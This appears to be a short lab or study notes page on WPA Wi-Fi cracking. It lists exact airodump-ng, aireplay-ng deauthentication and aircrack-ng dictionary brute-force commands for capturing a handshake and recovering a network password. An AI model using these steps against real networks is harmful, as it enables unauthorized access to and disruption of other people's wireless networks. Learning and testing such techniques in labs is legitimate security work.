---
title: Wi-Fi Hacking
sidebar_position: 7
---

## WPA Hacking
- List all interfaces with the command `iw dev`.
- Scan for new networks using `sudo iw dev wlan2 scan`
- Get the BSSID and SSID values.
- Find the channel value using `sudo airodump-ng wlan2`.
- Attack the channel and create an output file using `sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2`. Keep this running.
- Open another terminal and send deauthentication packets to the connected device using `sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`
- Wait for the 4 way handshake to happen in the first terminal.
- Bruteforce the password after the handshake happened using `sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap`.
- Get the password and connect to the interface.